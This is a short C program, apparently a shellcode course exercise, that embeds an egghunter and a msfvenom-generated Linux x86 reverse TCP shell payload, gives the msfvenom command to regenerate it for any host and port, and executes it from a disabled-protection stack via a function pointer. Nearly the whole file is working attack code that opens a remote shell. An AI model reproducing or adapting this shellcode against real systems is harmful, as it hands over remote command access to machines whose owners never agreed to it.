// Compile instruction: gcc -z execstack -fno-stack-protector shellcode.c -o shellcode 

#include<stdio.h>
#include<string.h>


//Egghunter shellcode from egghunter executable (retreived with objdump)
unsigned char egghunter[] = \
"\xbb\x50\x90\x50\x90\x31\xc9\xf7\xe1\xfc\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

//config payload, host en port:
//msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -b \x00
//note that  payload is being prepended with 2 iterations of the egg (\x50\x90\x50\x90)
unsigned char payload[] = \
"\x50\x90\x50\x90\x50\x90\x50\x90"
"\xdb\xc6\xbe\xa1\x7e\xcf\x3a\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x12\x31\x70\x17\x03\x70\x17\x83\x61\x7a\x2d\xcf\x50\x58\x46"
"\xd3\xc1\x1d\xfa\x7e\xe7\x28\x1d\xce\x81\xe7\x5e\xbc\x14\x48"
"\x61\x0e\x26\xe1\xe7\x69\x4e\x8d\x17\x8a\x8f\x19\x1a\x8a\x9e"
"\x85\x93\x6b\x10\x53\xf4\x3a\x03\x2f\xf7\x35\x42\x82\x78\x17"
"\xec\x73\x56\xeb\x84\xe3\x87\x24\x36\x9d\x5e\xd9\xe4\x0e\xe8"
"\xff\xb8\xba\x27\x7f";


main()
{

	printf("Egghunter shellcode Length:  %d\n", strlen(egghunter));
	printf("Payload shellcode Lenght: %d\n", strlen(payload));
	int (*ret)() = (int(*)())egghunter;

	ret();

}

	
